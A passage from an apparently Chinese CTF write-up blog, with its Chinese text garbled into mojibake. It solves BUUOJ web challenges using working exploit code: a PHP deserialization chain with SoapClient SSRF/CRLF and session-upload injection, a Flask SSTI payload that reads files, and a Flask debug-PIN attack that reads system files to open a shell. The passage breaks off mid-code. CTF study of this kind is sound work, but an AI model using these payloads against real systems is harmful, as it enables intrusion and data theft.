class="line">&#123;</span><br><span class="line">        public $name;</span><br><span class="line">        public $flag;</span><br><span class="line">        public $b;</span><br><span class="line">        </span><br><span class="line">        public function getflag()</span><br><span class="line">        &#123;</span><br><span class="line">                session_start(); </span><br><span class="line">                var_dump($_SESSION);</span><br><span class="line">                $a &#x3D; array(reset($_SESSION),$this-&gt;flag);</span><br><span class="line">                echo call_user_func($this-&gt;b,$a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class ee</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;&#123;$this-&gt;str2&#125;();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; $_POST[&#39;aa&#39;];</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>  æ ¹æ®<code>se.php</code>æ„é€ ååºåˆ—åŒ–é“¾ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. dd-&gt;getflag()æ˜¯è‚¯å®šè¦è¿è¡Œçš„</span><br><span class="line">2. ç”¨ee-&gt;__toString()æ¥æ„é€ (1)</span><br><span class="line">3. ç”¨cc-&gt;__invoke()ä¸­çš„å­—ç¬¦ä¸²è¿æ¥æ¥è§¦å‘(2)</span><br><span class="line">4. ç”¨aa-&gt;__call()ä¸­çš„&#96;$s1()&#96;æ¥è§¦å‘(3)</span><br><span class="line">5. ç”¨bb-&gt;__destruct()æ¥è§¦å‘(4)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥é€»è¾‘åè¿‡æ¥å†™ä»£ç ï¼Œå¾—åˆ°å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">class aa</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class bb</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cc</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">    public $mod3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dd</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $flag;</span><br><span class="line">    public $b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class ee</span><br><span class="line">&#123;</span><br><span class="line">    public $str1;</span><br><span class="line">    public $str2;</span><br><span class="line">&#125;</span><br><span class="line">$b &#x3D; new bb();</span><br><span class="line">$a &#x3D; new aa();</span><br><span class="line">$b-&gt;mod1 &#x3D; $a;</span><br><span class="line"></span><br><span class="line">$c &#x3D; new cc();</span><br><span class="line">$a-&gt;mod2[&#39;test2&#39;] &#x3D; $c;</span><br><span class="line"></span><br><span class="line">$e &#x3D; new ee();</span><br><span class="line">$c-&gt;mod1 &#x3D; $e;</span><br><span class="line">$d &#x3D; new dd();</span><br><span class="line">$e-&gt;str1 &#x3D; $d;</span><br><span class="line">$e-&gt;str2 &#x3D; &#39;getflag&#39;;</span><br><span class="line"></span><br><span class="line">$d-&gt;flag &#x3D; &#39;&#123;1&#125;&#39;;</span><br><span class="line">$d-&gt;b &#x3D; &#39;&#123;2&#125;&#39;;</span><br><span class="line"></span><br><span class="line">echo serialize($b);</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯å°†ä¸Šè¿°ä»£ç ä¸­çš„<code>{1},{2}</code>å¡«å…¥ã€‚</p><ol start="4"><li>æ ¹æ®<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F3339%23toc-3" target="_blank" rel="noopener">LCTF2018</a>ä¸­<code>bestphp&#39;s revenge</code>ä¸­è§£æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¤æ–­çš„æ˜¯æˆ‘ä»¬éœ€è¦å…ˆå°†<code>soapclient</code>å¯¹è±¡ååºåˆ—åŒ–çš„æ•°æ®å†™å…¥<code>session</code>ï¼Œåœ¨ä¸Šè¿°çš„<code>{2}</code>å¡«å…¥<code>call_user_func</code>ã€‚æ„é€ <code>soapclient</code>å¯¹è±¡ååºåˆ—åŒ–çš„æ•°æ®å¦‚ä¸‹ï¼š</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;interface.php&#39;;</span><br><span class="line">$post_string &#x3D; &#39;a&#x3D;1&amp;b&#x3D;2&#39;;</span><br><span class="line">$headers &#x3D; array(</span><br><span class="line">    &#39;X-Forwarded-For: 127.0.0.1&#39;,</span><br><span class="line">    &#39;Cookie: user&#x3D;xZmdm9NxaQ&#x3D;&#x3D;&#39;,</span><br><span class="line">    );</span><br><span class="line">$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;wupco^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers),&#39;uri&#39;      &#x3D;&gt; &quot;aaab&quot;));</span><br><span class="line">$aaa &#x3D; serialize($b);    </span><br><span class="line">$aaa &#x3D; str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);</span><br><span class="line">echo urlencode($aaa);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç½‘ä¸Šçš„è„šæœ¬ï¼Œéœ€è¦è®¾ç½®çš„ä¸»è¦æ˜¯<code>$target</code>å’Œ<code>headers</code>, å…¶ä¸­<code>headers</code><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqq_42181428%2Farticle%2Fdetails%2F100569464" target="_blank" rel="noopener">åˆ©ç”¨SoapClientç±»è¿›è¡ŒSSRF+CRLFæ”»å‡»</a></p><p><code>$target</code>ä¸ºä»€ä¹ˆè¦è®¾ç½®ä¸º<code>interface.php</code>è€Œä¸æ˜¯<code>http://127.0.0.1/index.php?method=get_flag</code>ï¼Œå› ä¸ºè¿™æ ·æ²¡æœ‰å®ä¾‹åŒ–Soapclientï¼Œå¦‚æœæˆ‘ä»¬è°ƒç”¨interface.phpå°±ä¼šå®ä¾‹åŒ–Soapclientç±»ï¼Œè¿™æ ·æ‰èƒ½æœ‰äº¤äº’ï¼Œæ‰èƒ½è¿”å›å€¼ã€‚å®é™…ä¸Šã€‚æˆ‘ä»¬èƒ½è¿”å›åˆ°ä¿¡æ¯ï¼Œæ˜¯å› ä¸ºè¿™è¾¹å·²ç»å®ä¾‹åŒ–äº†<code>SoapServer</code>ç±»çš„åŸå› ã€‚</p><p>interface.phpæºä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php   </span><br><span class="line">    include(&#39;Service.php&#39;);</span><br><span class="line">    $ser &#x3D; new SoapServer(&#39;Service.wsdl&#39;,array(&#39;soap_version&#39;&#x3D;&gt;SOAP_1_2));</span><br><span class="line">    $ser-&gt;setClass(&#39;Service&#39;);</span><br><span class="line">    $ser-&gt;handle();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨äº†<code>SoapServer</code>ç”Ÿæˆäº†<code>wsdl</code>æ–‡æ¡£ï¼Œä¼ å…¥ç±»<code>Service</code>æ¥å¯ç”¨æ¥å£æœåŠ¡ã€‚</p><p>å½“å®¢æˆ·ç«¯å®ä¾‹åŒ–äº†<code>SoapClient</code>åï¼Œå°±å¯ä»¥è°ƒç”¨åˆ°<code>Service</code>ç±»ä¸­çš„ä»»æ„æ–¹æ³•ï¼Œå¹¶é€šè¿‡<code>return</code>å¾—åˆ°å›æ˜¾</p><p>è€Œå¦‚æœæˆ‘ä»¬ä»…ä»…æ˜¯é€šè¿‡<code>SoapClient</code>è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•è§¦å‘<code>ssrf</code>ï¼Œæ˜¯ä¸ä¼šå¾—åˆ°å›æ˜¾çš„ï¼Œè€Œè¿™é‡Œ<code>Service</code>ç±»çš„<code>get_flag</code>æ–¹æ³•æ˜¾ç„¶æ˜¯éœ€è¦é€šè¿‡å›æ˜¾æ¥å¾—åˆ°<code>flag</code>ã€‚åœ¨æœ¬åœ°æˆ‘ä»¬æ­å»ºç¯å¢ƒæµ‹è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#server.php</span><br><span class="line">&lt;?php </span><br><span class="line">class Service</span><br><span class="line">&#123;</span><br><span class="line">    public function Get_flag()&#123;</span><br><span class="line">        return &quot;flag&#123;xxx&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ser &#x3D; new SoapServer(null,array(&#39;uri&#39;&#x3D;&gt;&#39;sampleA&#39;));</span><br><span class="line">$ser-&gt;setClass(&#39;Service&#39;);</span><br><span class="line">$ser-&gt;handle();</span><br><span class="line">?&gt;</span><br><span class="line">#client</span><br><span class="line">&lt;?php</span><br><span class="line">$client &#x3D; new SoapClient(null, array(</span><br><span class="line">        &#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;soap&#x2F;server.php&#39;,</span><br><span class="line">        &#39;uri&#39;&#x3D;&gt;&#39;sampleA&#39;</span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line">echo $client-&gt;Get_flag(); &#x2F;&#x2F;flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure><p>è¿™å°±éœ€è¦åˆ©ç”¨<code>SoapServer</code>,é€šè¿‡ååºåˆ—åŒ–<code>SoapClient</code>ç±»ï¼Œ<code>location</code>æŒ‡å‘<code>interface.php</code>å³æœåŠ¡ç«¯ï¼Œå› ä¸ºæœåŠ¡ç«¯çš„<code>setClass</code>ä¸º<code>Service</code>ç±»ï¼Œè€Œ<code>Get_flag</code>æ–¹æ³•åœ¨<code>Service</code>ç±»ä¸­ï¼Œæœ€åæˆ‘ä»¬é€šè¿‡<code>call_user_func</code>è°ƒç”¨<code>SoapClient</code>ç±»çš„<code>Get_flag</code>æ–¹æ³•å³è°ƒç”¨äº†<code>Service</code>ç±»çš„<code>Get_flag</code>æ–¹æ³•ã€‚</p><p>æ‰€ä»¥åœ¨åˆšæ‰çš„<code>{1}</code>éœ€è¦å¡«å†™æˆ‘ä»¬è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œå³<code>Get_flag</code>ã€‚</p><ol start="5"><li>æ¥ä¸‹æ¥æ˜¯å†™å…¥sessionï¼Œè¿™é‡Œé€šè¿‡<code>session.upload_progress</code>ä¸Šä¼ ä¸€ä¸ªå¯æ§çš„<code>session</code>æ–‡ä»¶ï¼Œç„¶åç”±äº<code>session</code>å¼•æ“çš„åˆ‡æ¢é€ æˆ<code>sessionååºåˆ—åŒ–æ¼æ´</code>ï¼Œå°±å¯ä»¥æ§åˆ¶ä¸€ä¸‹<code>$_SESSION</code>ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€</a>        </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#upload.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;5805442f-a566-4f5d-99e5-feb7310dc232.node3.buuoj.cn&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;1&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„payloadç²˜è´´å¤åˆ¶åˆ°<code>PHP_SESSION_UPLOAD_PROGRESS</code>çš„ä¸‹é¢ï¼Œç„¶åurlè§£ç ï¼Œåœ¨å‰é¢åŠ ä¸ª<code>|</code>,å¹¶å¢åŠ cookieä¿¡æ¯æŒ‡å®šsessionid</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200326154119737.png" alt></p><p>æ­¤æ—¶æˆ‘ä»¬å·²ç»å°†<code>poc</code>å†™å…¥åˆ°<code>sessionä¸­PHPSESSID</code>ä¸ºbbbçš„å€¼ä¸­ã€‚<br> ä¸Šä¼ <code>se.php</code>ååºåˆ—åŒ–çš„æ•°æ®ï¼Œå³å¯è·å¾—<code>flag</code></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200326154509055.png" alt></p><p>æ³¨æ„ç‚¹ï¼šåœ¨phpé‡Œé¢serializeä¹‹åä¸€å®šè¦urlencodeï¼Œä¸ç„¶ç²˜è´´å¤åˆ¶çš„è¯å¾ˆå®¹æ˜“ä¸¢å¤±ä¸€äº›ä¸å¯è§å­—ç¬¦</p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://www.cnblogs.com/20175211lyz/p/12285279.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/12285279.html</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/103760266" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/103760266</a></p><p><a href="http://github.mrkaixin.computer/2020/03/16/BUU(ä¸‰)/" target="_blank" rel="noopener">http://github.mrkaixin.computer/2020/03/16/BUU(%E4%B8%89)/</a></p><p>[<a href="http://www.gtfly.top/2020/03/12/2019-12-17-SWPU2019%20wp/#web6]" target="_blank" rel="noopener">http://www.gtfly.top/2020/03/12/2019-12-17-SWPU2019%20wp/#web6]</a>(<a href="http://www.gtfly.top/2020/03/12/2019-12-17-SWPU2019" target="_blank" rel="noopener">http://www.gtfly.top/2020/03/12/2019-12-17-SWPU2019</a> wp/#web6)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ-webåˆ·é¢˜ï¼ˆä¸€ï¼‰</title>
      <link href="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#0x-01-CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="0x 01 [CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>0x 01 [CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h3><ul><li>è€ƒç‚¹</li></ul><p>sstiã€Flask debug pinå®‰å…¨é—®é¢˜                </p><ul><li>è§£é¢˜è¿‡ç¨‹</li></ul><p>è¶…è¿‡å››ä½çš„å­—ç¬¦åŠ å¯†ä¼šæŠ¥é”™, æŠ¥é”™ä¿¡æ¯ä¸­å¯ä»¥çœ‹åˆ°éƒ¨åˆ†æºç </p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212222846945.png" alt></p><p>å°†è¦åŠ å¯†çš„ä¸œè¥¿æ¢æˆ%ff, åˆçˆ†å‡ºäº†æºç </p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212222934076.png" alt></p><p>è§£æ³•ä¸€ï¼š</p><p>sstiè¯»å–flagæ–‡ä»¶</p><p>åˆ©ç”¨å·¥å…·CyberChefæˆ–è€…ä½¿ç”¨è„šæœ¬åŠ å¯†</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212225621819.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">class RC4:</span><br><span class="line">    def __init__(self, key):</span><br><span class="line">        self.key &#x3D; key</span><br><span class="line">        self.key_length &#x3D; len(key)</span><br><span class="line">        self._init_S_box()</span><br><span class="line"></span><br><span class="line">    def _init_S_box(self):</span><br><span class="line">        self.Box &#x3D; [i for i in range(256)]</span><br><span class="line">        k &#x3D; [self.key[i % self.key_length] for i in range(256)]</span><br><span class="line">        j &#x3D; 0</span><br><span class="line">        for i in range(256):</span><br><span class="line">            j &#x3D; (j + self.Box[i] + ord(k[i])) % 256</span><br><span class="line">            self.Box[i], self.Box[j] &#x3D; self.Box[j], self.Box[i]</span><br><span class="line"></span><br><span class="line">    def crypt(self, plaintext):</span><br><span class="line">        i &#x3D; 0</span><br><span class="line">        j &#x3D; 0</span><br><span class="line">        result &#x3D; &#39;&#39;</span><br><span class="line">        for ch in plaintext:</span><br><span class="line">            i &#x3D; (i + 1) % 256</span><br><span class="line">            j &#x3D; (j + self.Box[i]) % 256</span><br><span class="line">            self.Box[i], self.Box[j] &#x3D; self.Box[j], self.Box[i]</span><br><span class="line">            t &#x3D; (self.Box[i] + self.Box[j]) % 256</span><br><span class="line">            result +&#x3D; chr(self.Box[t] ^ ord(ch))</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">a &#x3D; RC4(&#39;HereIsTreasure&#39;)</span><br><span class="line">cmd &#x3D; &quot;&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#39;&#x2F;flag.txt&#39;).read() &#125;&#125;&quot;</span><br><span class="line">payload &#x3D; urllib.parse.quote(a.crypt(cmd))</span><br><span class="line">res &#x3D; requests.get(url + payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>è§£æ³•äºŒï¼š</p><p>Flask debug pinå®‰å…¨é—®é¢˜æ‰§è¡Œshell</p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg</a></p><ul><li>ç”Ÿæˆpinç å¿…è¦æ–‡ä»¶ï¼š<ul><li>username #ç”¨æˆ·åï¼Œå¯ä»¥æŸ¥çœ‹/etc/passwdæˆ–è€…è¯»å–/proc/self/environç¯å¢ƒå˜é‡</li><li>modename #flask.app</li><li>getattr(app,â€™<strong>name</strong>â€˜,getattr(app.<strong>class</strong>,â€™<strong>name</strong>â€˜)) # Flask</li><li>getattr(mod,â€™<strong>file</strong>â€˜,None) #app.pyçš„ç»å¯¹è·¯å¾„</li><li>uuid.getnode() #macåœ°å€åè¿›åˆ¶</li><li>get_machine_id() #dockerç¯å¢ƒä¸‹è¯»å–/proc/self/cgroup å…¶ä½™ä¾æ¬¡å°è¯•è¯»å–â€/etc/machine-idâ€, â€œ/proc/sys/kernel/random/boot_idâ€ä¸¤ä¸ªæ–‡ä»¶</li></ul></li></ul><p>ä¾æ¬¡éœ€è¦è·å–6ä¸ªå˜é‡ï¼Œé¦–å…ˆæ˜¯ç”¨æˆ·åï¼Œæˆ‘é‡‡ç”¨çš„åŠæ³•æ˜¯è¯»å–/proc/self/environç¯å¢ƒå˜é‡çš„åŠæ³•ï¼ŒåŠ å¯†ç”Ÿæˆè¯»å–æ–‡ä»¶çš„payloadï¼š</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212225842982.png" alt></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212225820453.png" alt>å¯è§usernameçš„å€¼ä¸ºglzjin</p><p>ç„¶åæ˜¯modnameï¼Œä¾ç„¶ä¸ºflask.app</p><p>ç¬¬ä¸‰ä¸ªå€¼<code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code>ä¾ç„¶ä¸ºFlask</p><p>ç¬¬å››ä¸ªå€¼<code>getattr(mod, &quot;__file__&quot;, None)</code>è¦æ³¨æ„ï¼ŒæœåŠ¡å™¨ä¸Špython2çš„å®‰è£…è·¯å¾„å’Œæˆ‘ä»¬æœ¬åœ°çš„å¯ä¸å¤ªä¸€æ ·ï¼Œè¿™å¯ä»¥ä»æŠ¥é”™çŒœæµ‹è¿™ä¸ªå€¼åº”è¯¥ä¸º<code>/usr/local/lib/python2.7/site-packages/flask/app.pyc</code></p><p>éšåæ˜¯str(uuid.getnode())çš„å€¼ï¼Œè¯»å–æœåŠ¡å™¨çš„/sys/class/net/eth0/addressæ–‡ä»¶ï¼Œå…¶ç»“æœä¸ºï¼š<code>02:42:ae:00:9e:fc</code>,å†™ä¸€ä¸ªè„šæœ¬è½¬æ¢ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#-*-coding:utf8-*-</span><br><span class="line">machex &#x3D; &quot;0x&quot;+&quot;02:42:ae:00:9e:fc&quot;.replace(&#39;:&#39;,&#39;&#39;)</span><br><span class="line">print int(machex,16)</span><br><span class="line">### output</span><br><span class="line">2485410373372</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå°è¯•æ‰“å¼€/proc/self/cgroupæ–‡ä»¶ï¼Œè¯»å–ç¬¬ä¸€è¡Œï¼Œå¹¶å°†/docker/å­—ç¬¦ä¸²åé¢çš„å†…å®¹ä½œä¸ºè¯¥å‡½æ•°çš„è¿”å›å€¼ï¼Œå¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨æˆ–è€…è¯¥å€¼ä¸å­˜åœ¨ï¼Œæ‰ä¼šèµ°å…¥å¸ˆå‚…ä»¬æ–‡ç« ä¸­æåˆ°çš„ä¾æ¬¡å°è¯•è¯»å–â€/etc/machine-idâ€, â€œ/proc/sys/kernel/random/boot_idâ€ä¸¤ä¸ªæ–‡ä»¶çš„æµç¨‹</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212230454251.png" alt></p><p>é‚£ä¹ˆå®ƒçš„get_machine_id()çš„è¿”å›å€¼å°±åº”è¯¥æ˜¯ç¬¬ä¸€è¡Œ/docker/åé¢çš„é‚£éƒ¨åˆ†ï¼Œå³</p><p>a8832ad13feb717ec6ae4c2f4a79b79b64c63329bd5497b7ab3f1b055860e5b8</p><p>è‡³æ­¤ï¼Œæ‰€æœ‰å‚æ•°è·å–å®Œæ¯•ï¼Œè¾“å…¥payloadè®¡ç®—pinç ï¼š</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212230746497.png" alt></p><p>åœ¨æŠ¥é”™é¡µé¢ä¸­è¾“å…¥pinç ï¼ŒæˆåŠŸæ‰“å¼€python shell,å‰©ä¸‹å°±æ˜¯è¯»å–flagäº†</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212230827937.png" alt></p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p> ä»ä¸€é“ctfé¢˜è°ˆè°ˆflaskå¼€å¯debugæ¨¡å¼å­˜åœ¨çš„å®‰å…¨é—®é¢˜ </p><p><a href="https://www.anquanke.com/post/id/197602" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197602</a></p><p><a href="https://eustiar.com/archives/576" target="_blank" rel="noopener">https://eustiar.com/archives/576</a></p><p><a href="https://ch4ser-go.github.io/2019/05/27/SSTI/" target="_blank" rel="noopener">https://ch4ser-go.github.io/2019/05/27/SSTI/</a></p></blockquote><h3 id="0x-02-ç½‘é¼æ¯-2018-Comment"><a href="#0x-02-ç½‘é¼æ¯-2018-Comment" class="headerlink" title="0x 02 [ç½‘é¼æ¯ 2018]Comment"></a>0x 02 [ç½‘é¼æ¯ 2018]Comment</h3><ul><li>è€ƒç‚¹</li></ul><p>gitæ³„éœ²ã€SQLäºŒæ¬¡æ³¨å…¥</p><ul><li>è§£é¢˜è¿‡ç¨‹</li></ul><ol><li>æ§åˆ¶å°æç¤ºå­˜åœ¨gitæ³„éœ²ï¼Œä½¿ç”¨GitHackæ³„éœ²ä»£ç å¾—åˆ°</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213104847569.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 